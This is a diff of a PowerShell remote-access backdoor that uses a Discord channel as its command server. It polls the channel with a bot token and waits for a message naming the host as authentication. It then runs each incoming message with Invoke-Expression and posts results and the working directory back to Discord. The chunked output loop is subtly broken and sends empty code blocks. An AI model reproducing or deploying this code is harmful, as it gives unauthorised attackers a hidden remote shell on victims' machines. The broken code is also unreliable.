@@ -5,123 +5,104 @@ $previouscmd = ""
 $authenticated = 0
 
 function PullMsg {
-    try {
-        $wc = [System.Net.WebClient]::new()
-        $wc.Headers.Add('Authorization', "Bot $token")
-        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=5")
-        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
-        if ($msg) { $script:response = $msg.Trim() }
-    } catch {
-        Write-Warning "Ошибка получения команды: $_"
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", $headers.Authorization)
+    $result = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
+    if ($result) {
+        $most_recent_message = ($result | ConvertFrom-Json)[0]
+        if (-not $most_recent_message.author.bot) {
+            $script:response = $most_recent_message.content
+        }
     }
 }
 
 function sendMsg {
     param([string]$Message)
-    if (!$Message) { return }
-    $Message = $Message -replace '`', "'"
-    $uri = "https://discord.com/api/v9/channels/$chan/messages"
-    $payload = @{
-        "content" = $Message
-        "username" = "$env:COMPUTERNAME"
-    }
-    $jsonBody = $payload | ConvertTo-Json -Compress
-    $maxRetries = 3
-    $retryCount = 0
-    while ($retryCount -lt $maxRetries) {
+    $dir = $PWD.Path
+    $url = "https://discord.com/api/v9/channels/$chan/messages"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+    if ($Message) {
+        $jsonBody = @{
+            "content" = "$Message"
+            "username" = "$dir"
+        } | ConvertTo-Json
+        $webClient.Headers.Add("Content-Type", "application/json")
         try {
-            Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body $jsonBody -TimeoutSec 10 | Out-Null
+            $response = $webClient.UploadString($url, "POST", $jsonBody)
             Write-Host "Message sent to Discord"
-            break
         } catch {
-            $errorMessage = $_.Exception.Response.StatusCode.Value__ 2>&1
-            if ($errorMessage -eq 429 -or $_.Exception.Response.StatusCode.Value__ -eq 429) {
-                # rate limited
-                Write-Warning "Rate limited, retrying after delay..."
-                Start-Sleep -Seconds 2
-                $retryCount++
-            }
-            elseif ($_.Exception.Response.StatusCode.Value__ -eq 403) {
-                Write-Warning "Forbidden error (403), likely missing permissions."
-                break
-            }
-            else {
-                Write-Warning "Failed to send message: $_"
-                break
-            }
+            Write-Warning "Failed to send message: $_"
         }
     }
 }
 
-
-Function Authenticate {
-    if ($response -like "$env:COMPUTERNAME") {
+Function Authenticate{
+    if ($response -like "$env:COMPUTERNAME"){
         $script:authenticated = 1
         $script:previouscmd = $response
         sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
-        sendMsg "``PS | $($PWD.Path)>``"
+        sendMsg "``PS | $dir>``"
     } else {
         $script:authenticated = 0
         $script:previouscmd = $response
-    }
+    } 
 }
 
-# ------------ MAIN LOOP ---------------
+# ========== MAIN ==========
 PullMsg
 $previouscmd = $response
-sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"
+sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
 
 while ($true) {
     PullMsg
-    if ($response -and $response -ne $previouscmd) {
-        $previouscmd = $response
+    if ($response -ne $previouscmd) {
         $dir = $PWD.Path
-
+        Write-Host "Command found!"
         if ($authenticated -eq 1) {
             if ($response -eq "close") {
-                sendMsg ":octagonal_sign: Session Closed."
+                $previouscmd = $response        
+                sendMsg ":octagonal_sign:  **$env:COMPUTERNAME** | ``Session Closed.``  :octagonal_sign:"
                 break
             }
             if ($response -eq "Pause") {
-                $authenticated = 0
-                sendMsg ":pause_button: Session Paused."
-                continue
+                $script:authenticated = 0
+                $previouscmd = $response
+                sendMsg ":pause_button:  **$env:COMPUTERNAME** | ``Session Paused..``  :pause_button:"
+                Start-Sleep -Milliseconds 250
+                sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
             }
-
-            # Исполнение команды (сначала PowerShell, потом по необходимости cmd.exe)
-            $output = ""
-            try {
-                $output = Invoke-Expression $response 2>&1 | Out-String
-            } catch {
-                $output = "$_"
-            }
-
-            if (-not $output.Trim()) {
-                try {
-                    $output = (cmd.exe /c $response 2>&1 | Out-String)
+            else {
+                $Result = try {
+                    iex($response) 2>&1
                 } catch {
-                    $output = "$_"
+                    $_
+                }
+                if ($null -eq $Result -or $Result -eq "" -or ($Result -is [System.Management.Automation.ErrorRecord])) {
+                    $script:previouscmd = $response
+                    sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
+                    Start-Sleep -Milliseconds 250
+                    sendMsg "``PS | $dir>``"
+                }
+                else {
+                    $script:previouscmd = $response
+                    $output = ($Result | Out-String)
+                    $maxBatchSize = 1900
+                    $total = $output.Length
+                    for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
+                        $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
+                        sendMsg "``````"
+                        Start-Sleep -Milliseconds 250
+                    }
+                    sendMsg "``PS | $dir>``"
                 }
             }
-
-            $output = $output.Trim()
-            if ($output) {
-                $maxBatchSize = 1900
-                $total = $output.Length
-                for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
-                    $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
-                    sendMsg "``````"
-                    Start-Sleep -Milliseconds 300
-                }
-            } else {
-                sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
-            }
-            sendMsg "``PS | $dir>``"
         } else {
             Authenticate
         }
     }
     Start-Sleep -Seconds 5
 }
-
-
